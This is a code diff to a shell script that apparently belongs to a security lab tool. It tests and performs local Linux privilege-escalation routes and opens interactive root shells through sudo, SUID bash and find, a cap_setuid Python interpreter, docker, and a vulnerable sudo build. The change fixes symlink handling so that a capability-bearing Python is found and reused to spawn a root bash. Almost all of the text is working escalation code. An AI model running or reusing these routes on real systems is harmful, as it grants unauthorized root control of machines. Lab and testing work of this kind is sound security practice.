@@ -38,6 +38,8 @@ LAB_CVE_ENABLED=0
 CVE_SUDO='/opt/edamame-vuln-sudo/bin/sudo'
 CVE_SUDO_SHA='8c18093b760250d35b1ebcc5ecd12b33d17b8a2cfc27f170bbb4f62b674702cd'
 CVE_POC_SHA='9826979c7a3cb1ca582862768d74245806051db5601c7b6a7e13bde93b8052d7'
+SUID_FIND_PATH=''
+PY_CAP_PATH=''
 
 usage() {
   cat <<'EOF'
@@ -851,7 +853,7 @@ asset_from_release() {
 }
 
 verify_recipe() {
-  local recipe=$1 py caps image probe version cve_dir finder
+  local recipe=$1 py caps image probe version cve_dir finder resolved
   case $recipe in
     already-root) [[ $EUID == 0 ]] ;;
     sudo-shell) command -v sudo >/dev/null 2>&1 && sudo -n /bin/bash -i -c 'test "$EUID" = 0' >/dev/null 2>&1 ;;
@@ -870,8 +872,16 @@ verify_recipe() {
     python-cap-setuid)
       py=$(command -v python3 || true)
       [[ -n $py ]] && command -v getcap >/dev/null 2>&1 || return 1
-      caps=$(getcap "$py" 2>/dev/null)
-      [[ $caps == *cap_setuid* ]] && "$py" -c 'import os; os.setuid(0); assert os.getuid()==0' >/dev/null 2>&1
+      # command -v names the stable python3 path, which is a symlink to the
+      # versioned interpreter on every mainstream distribution. getcap does not
+      # follow symlinks, so an uncapped-looking name hides a cap_setuid
+      # interpreter and a working route gets recorded as not met.
+      resolved=$(readlink -f -- "$py" 2>/dev/null) || resolved=''
+      [[ -n $resolved && -f $resolved && -x $resolved ]] || resolved=$py
+      caps=$(getcap "$resolved" 2>/dev/null)
+      [[ $caps == *cap_setuid* ]] || return 1
+      PY_CAP_PATH=$resolved
+      "$resolved" -c 'import os; os.setuid(0); assert os.getuid()==0' >/dev/null 2>&1
       ;;
     docker-host-root)
       command -v docker >/dev/null 2>&1 || return 1
@@ -910,8 +920,7 @@ open_shell() {
     suid-bash) /bin/bash -p -i ;;
     suid-find) "$SUID_FIND_PATH" /dev/null -exec /bin/bash -p -i \; ;;
     python-cap-setuid)
-      py=$(command -v python3)
-      "$py" -c 'import os; os.setuid(0); os.execv("/bin/bash",["/bin/bash","-i"])'
+      "$PY_CAP_PATH" -c 'import os; os.setuid(0); os.execv("/bin/bash",["/bin/bash","-i"])'
       ;;
     docker-host-root)
       image=$(docker image ls --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | awk '$0 !~ /<none>/ {print; exit}')
